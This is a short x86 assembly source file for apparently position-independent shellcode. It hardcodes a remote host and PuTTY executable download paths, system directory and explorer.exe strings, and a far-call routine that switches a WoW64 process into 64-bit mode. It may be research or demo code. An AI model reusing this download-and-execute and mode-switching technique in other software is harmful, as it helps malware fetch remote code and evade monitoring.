.686

.MODEL FLAT

.code

; void __stdcall ep(struct _PEB *)
extern ?ep@@YGXPAU_PEB@@@Z : PROC

; void __stdcall epASM(struct _PEB *)
?epASM@@YGXPAU_PEB@@@Z proc
	jmp ?ep@@YGXPAU_PEB@@@Z
?epASM@@YGXPAU_PEB@@@Z endp

include <../scentry/nobase32.inc>

include <imp.asm>

; const wchar_t *__stdcall host(void)

createWstring ?host@@YGPB_WXZ, <the.earth.li>
createWstring ?URL32@@YGPB_WXZ, </~sgtatham/putty/latest/w32/putty.exe>
createWstring ?URL64@@YGPB_WXZ, </~sgtatham/putty/latest/w64/putty.exe>

createWstring ?DLLMask@@YGPB_WXZ, <*.dll>
createWstring ?System32@@YGPB_WXZ, <\systemroot\system32\\\ >
createWstring ?Syswow64@@YGPB_WXZ, <\systemroot\syswow64\\\ >
createWstring ?explorer@@YGPB_WXZ, <\explorer.exe>

; int __fastcall Exec64(void *,void *,void *)
?Exec64@@YIHPAX00@Z proc
  xchg edi,[esp+4]
  xchg esi,[esp+8]
  xchg ebp,[esp+12]
  jmp @2
  ALIGN 16
@3:
INCLUDE <../ExecX64/ExecX64.asm>
@2:
  push 33h
  call @1
  ;++++++++ x64 +++++++++
  call @3
  retf
  ;-------- x64 ---------
@1:
  call fword ptr [esp]
  pop ecx
  pop ecx
  mov edi,[esp+4]
  mov esi,[esp+8]
  mov ebp,[esp+12]
  ret 12
?Exec64@@YIHPAX00@Z endp

end